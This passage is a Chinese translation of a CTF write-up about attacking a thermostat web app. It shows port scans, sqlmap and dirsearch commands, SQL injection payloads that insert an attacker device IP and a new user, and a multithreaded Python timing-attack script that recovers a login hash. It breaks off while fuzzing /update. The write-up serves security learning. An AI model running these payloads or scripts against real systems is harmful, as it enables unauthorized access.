#### 前言
本文的第一部分[文章链接](https://xz.aliyun.com/t/4691 "文章链接")  
上文我们已经获得一个可以从外网访问的真实IP
#### Server 104.196.12.98
第一步是侦查，这里使用端口扫描来发现是否有服务运行，结果我得到了80端口（http）。
    Starting masscan 1.0.6 (http://bit.ly/14GZzcT ) at 2019-03-02 22:32:46 GMT
     -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
    Initiating SYN Stealth Scan
    Scanning 1 hosts [65536 ports/host]
    Discovered open port 22/tcp on 104.196.12.98
    Discovered open port 80/tcp on 104.196.12.98
[](./img/2033103288658411400.png
"80端口界面")  
现在我们面临一个新的Web应用程序，其中包含`username`和`password`输入的表单。另外阅读源代码（html）我们可以看到有一个`login.js`。让我们使用Burp代理并提交登录表单的请求。用户名和密码可以是什么值？从我们之前的SQL注入，我们得到了admin：password。所以这是一个不错的选择：
    POST / HTTP/1.1
    Host: 104.196.12.98
    Content-Length: 68
    hash=3af937e7424ef6124f8b321d73a96e737732c2f5727d25c622f6047c1a4392a
我们可以注意到POST请求不是发送username和password而是`hash`。是时候看看login.js在做什么了。阅读javascript代码，我们可以发现`hash`和`fhash`函数，使我们了解它是一个哈希算法。还有一些填充和XOR位操作。几乎可以肯定它实际上是一个哈希函数，因此后端将无法获得原始输入值（用户名和密码）。在这种情况下，我们可以推断后端也会使用相同的function计算哈系值，如login.js。然后它将比较两个哈希值。因此，我们进行身份验证需要使用哈希。
    $ python sqlmap.py -v 3 -u http://104.196.12.98/ --data "hash=*" --level=5 --risk=3 --random-agent
结果：什么也没有......也许我们可以找到另一个端点？是时候使用[dirseach](https://github.com/maurosoria/dirsearch
"dirseach")和[SecList](https://github.com/danielmiessler/SecLists "SecList")
中的一些字典了：
    # ./tools/dirsearch/dirsearch.py -b -t 10 -e php,asp,aspx,jsp,html,zip,jar,sql -x 500,503 -r -w wordlists/raft-large-words.txt -u http://104.196.12.98
     _|. _ _  _  _  _ _|_    v0.3.8
    (_||| _) (/_(_|| (_| )
    Extensions: php, asp, aspx, jsp, html, zip, jar, sql | Threads: 10 | Wordlist size: 119600
    Target: http://104.196.12.98
    [15:00:31] Starting:
    [15:00:35] 302 -  209B  - /update  ->  http://104.196.12.98/
    [15:00:38] 302 -  209B  - /main  ->  http://104.196.12.98/
    [15:00:40] 302 -  209B  - /control  ->  http://104.196.12.98/
    [15:01:10] 302 -  209B  - /diagnostics  ->  http://104.196.12.98/
有趣的是，尝试一些新的终端。但不幸的是，他们都给了302并重定向到根（/）目录。因此，我们需要以某种方式进行身份验证。
让我们再次关注哈希......
#### Hash
重温主流的hash攻击是一个好的决定
##### Hash Extension? or Hash Colision?
它可能是哈希扩展漏洞吗？简而言之，当基于Merkle-Damgård的哈希被误用来作为message认证码时使用这种结构H(secret ‖
message),并且message和secret的长度已知，长度扩展攻击允许任何人在message末尾包含额外的数据，并在不知道secret的情况下生成有效哈系值。在我们的场景中，这不适用，因为没有要验证的签名或message认证码。  
或者它可能是哈希碰撞？首先，作为一个哈希碰撞，我们需要一个有效的哈希，这里不是这种情况。
#### What to do now?
此刻我处境艰难。没有主意......我确信有些重要的东西我还没找到。因此，我决定回去搜索更多漏洞或任何相关信息。
##### Maybe a SSRF?
我是否可以在devices表中插入另一个IP并使用`setTemp`命令更改恒温器温度(第一部分文章中的内容)？也许当有人改变温度时，所有设备都会收到带认证码的HTTP请求，因此我可以使用它来登录。似乎可行。第一步是尝试`INSERT`：
    System.out.println(PayloadRequest.sendCommand("';INSERT INTO devices(ip) values('X.X.X.X'); commit#", "", "getTemp"));Create another user?
好的，它奏效了。我把我的IP地址作为了一台device。现在让我们在我的服务器（X.X.X.X）上运行[tcpdump](https://www.tcpdump.org/
"tcpdump")以捕获所有网络流量。最后，我们需要使用`getTemp`和`setTemp`命令发送一些请求。
    # tcpdump -i eth0 -nnvvXS
但是什么也没有发生......只是在h1-415期间来自旧金山某人的连接（80端口）。:)明确了，我应该删除我的IP地址。这里死路一条。
##### Create another user?
我们可以插入任何device，也许我们可以插入一个用户并将其用作`Thermostat Login`的登录名和密码。
    System.out.println(PayloadRequest.sendCommand("';INSERT INTO users(username, password) values('manoelt','e08e9df699ce8d223b8c9375471d6f0f'); commit#", "", "getTemp"));
不，我们无法登录！:(
##### Another command?
是否还有其他参数？让我们爆破吧！  
一段时间后，刚刚弹出一个`diag`命令带有以下响应`{"success": false, "error": "Missing diagnostic
parameters"}`。好了，现在是时候爆破参数名了......经过几天时间使用所有字典来爆破dig命令的参数，甚至使用[cewl](https://github.com/digininja/CeWL
"cewl")从真正的恒温器手册中构建一些特定的字典，最后啥也没有找到！
#### Timing Attack
也许我应该将login.js中的JS代码用python重写一遍并进行代码审计？好的......所以在进行代码审计时，我注意到JS代码有些奇怪：
    function hash(x) {
        x += '\x01\x00';
        while((x.length & 0xFF) != 0)
            x += String.fromCharCode((x.length & 0xFF) ^ x.charCodeAt[x.length & 0xFF]);
        ...
    }
你看见它了吗？这是一个填充算法，并且XOR操作无法按预期工作，因为它：
    x.charCodeAt[x.length & 0xFF]
这是一个拼写错误，这段错误的代码可能会使哈希函数在后端服务器上进行正确的验证变得不可行，因为我们不会得到相同的哈希值...这是一个很好的假设！  
在针对哈希函数的攻击中，我看到了一个关于`Timing
Attack`的有趣的话题：比较hash的时候确保响应时间是一个固定值，这样攻击者就无法在一个在线系统中使用时序攻击获得密码的hash值，然后将其破解。  
检查两个字节（字符串）序列是否相同的标准方法是比较第一个字节，然后是第二个字节，然后是第三个字节，依此类推。一旦发现两个字符串的字节不相同，您就会发现它们不同并且作出否定的响应。如果你遇到两条字符串没有一个不同的字节，你知道字符串相同时并且返回一个肯定的结果。这意味着比较两个字符串可能需要不同的时间，具体取决于字符串的匹配程度。（笔者：后端进行字符串比较时，是一个字节一个字节比较，第一个字节比较时，若相同则时间会长一点，若不同则立马响应否定结果，此时我们可以爆破找到第一个相同的字节，再继续爆破下一个字节，直到整条字符串相同）  
是时候为时序攻击创建PoC了。我们的想法是发送0x00到0xFF的范围中的每个hash作为第一个两个字符，把hash剩下的部分填充ff直到总共64个字符（`padding()`）。在hash中两个字符代表一个字节（16进制）。发送请求后，我们将每一次字节比较所花费的时间保存在`dict`中。  
我得到了:
    { ...
        "ef": 0.6429750000000001,
        "f0": 0.6428805,
        "f1": 0.6429075,
        "f2": 0.6429579999999999,
        "f3": 0.6426725,
        "f4": 0.6429405000000001,
        "f5": 0.6432635,
        "f6": 0.6427134999999999,
        "f7": 0.6425565,
        "f8": 0.6429004999999999,
        "f9": 1.1436354999999998,
        "fa": 0.6428285,
        "fb": 0.642867,
        "fc": 0.6430150000000001,
        "fd": 0.642695,
        "fe": 0.643376,
    }
请注意，`'f9'`花了1.14秒，比其他人多0.5秒。现在我应该测试接下来的两个字符以f9为前缀的hash值，依此类推，直到我得到完整的hash值。
##### Multithreading
在单个线程中执行此计时攻击需要数小时。所以我们需要使用多线程来完成它。我发现我的VPS网络最可靠的结果是最多使用16个线程。通用思路是构建一个十六进制范围为0x00到0xff的队列，并让每个线程执行一个检查已用时间的请求。距离之前的`base_value`时间大于0.5秒意味着我们找到了另一个“byte”。
让我们看看每个线程将执行的主要功能：
    def process_data(threadName, q): # Thread main function
        global found
        while not exitFlag:   # A flag to stop all threads
            queueLock.acquire()  # Acquire Queue
            if not workQueue.empty(): 
                payload = q.get()
                queueLock.release() # Release Queue
                time_elapsed = send(payload) # Send the hash and get time_elapsed
                if len(payload) == 64 and time_elapsed == 999: # Last two chars case
                    found = payload
                    return
                while time_elapsed - base_time_value > 0.8: # Possibly a network issue
                    time_elapsed = send(payload) # Try again
                if (time_elapsed - base_time_value) > 0.4: # Maybe we have found
                    time.sleep((len(found)/2)*0.6+1)   # Waiting to confirm
                    again = send(payload)   # Confirming
                    if (again - base_time_value) > 0.45:
                        found = payload[:len(found)+2] # Found!
                        print('Found: ' + payload)
            else:
                queueLock.release()
                time.sleep(2)
如果你有额外的时间，你可以在这里观看所有操作：;和快捷版本：
最后我们可以使用f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8作为哈希值登录。
#### Thermostat web app
现在我们已经通过身份验证，我们可以浏览该应用程序。所有端点都在正常工作，除了`/diagnostics`，它提示了`Unauthorized`。此外，在`/control`下有一个通过对`/setTemp`执行POST来改变温度的表单。我花了一些时间测试这个端点，发送各种`payload`，但它似乎只接受数字。
##### /update
当我们访问`/update`时，我们得到：
    Connecting to http://update.flitethermostat:5000/ and downloading update manifest
    ...
    ...
    ...
    Could not connect
这立刻引起了我的注意。如果有一些隐藏参数怎么办？要做到这一点，我们有很多选择：Param Miner（Burp），Turbo
Intruder（Burp），Parameth，WFuzz，FFUF等。在此时我一直在寻找性能最好的那个，我选择了Turbo Intruder：Turbo
Intruder是一个Burp Suite扩展，用于发送大量HTTP请求并分析结果。它旨在通过处理那些需要速度快，持久或着复杂的攻击来补充Burp
Intruder。使用Python配置攻击。
Request:
    GET /update?%s HTTP/1.1